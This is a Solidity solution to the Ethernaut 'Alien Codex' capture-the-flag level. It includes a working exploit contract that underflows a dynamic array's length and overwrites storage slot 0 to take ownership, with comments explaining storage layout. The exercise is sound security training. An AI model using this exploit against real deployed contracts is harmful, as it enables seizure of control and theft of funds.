// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x920d424b20B6Fc0482211FF47e9fce6209495912

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// useful material

// https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html
// https://listed.to/@r1oga/13892/ethernaut-levels-19-to-21#AlienCodex

// solution

// to solve it you need to know how dynamic size arrays storage works
// when you declare variables in your contract, the slot corresponding
// to that array will only store the number of elements it has, then the
// array data will be stored starting at keccak256(p), being p the slot of the array
// and then each item will be stored at keccak256(p) + i, being i the index of the element
// (i think that changes if the array items are smaller that 16 bytes, because they will share slots)

// also you need to know that the maximum number of slots for a smart contract are 2^256 - 1
// and also that in solc 0.5 version, you could change the length of an array directly with array.length

contract HackAlienCodex {
    function claimOwnership(address alien) public {
        // make contact to be able to call revise() later
        alien.call(abi.encodeWithSignature("make_contact()"));

        // retract() will reduce the length of the codex array by 1, as initially has a length of 0,
        // it will undeflow and make avalaible any index in the array
        alien.call(abi.encodeWithSignature("retract()"));

        // we know the _owner address is stored at slot 0, and we can calculate the position of any element
        // in the array, also we know that we only got 2^256 - 1 slots available, and if we try to access an array
        // element in the position 2^256, it will overflow and access the 0 slot
        // and we know the array is codex is located at slot 1, so the data will be stored starting at position keccak256(1)

        // so we can calculate the index of the element that allow us to access slot 0 to change _owner
        // last slot = 2^256 - 1 - keccak256(1)
        // first slot (0) = 2^256 - keccak256(1)

        uint256 index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));

        // bytes and strings are right padded, but we need our value to be left padded, so the address stay ar right
        // for that, we first cast the address to uint256 and then to bytes32
        bytes32 content = bytes32(uint256(uint160(msg.sender)));

        // then we call revise with the calculated index to set our address in the slot 0
        alien.call( abi.encodeWithSignature("revise(uint256,bytes32)", index, content));
    }
}
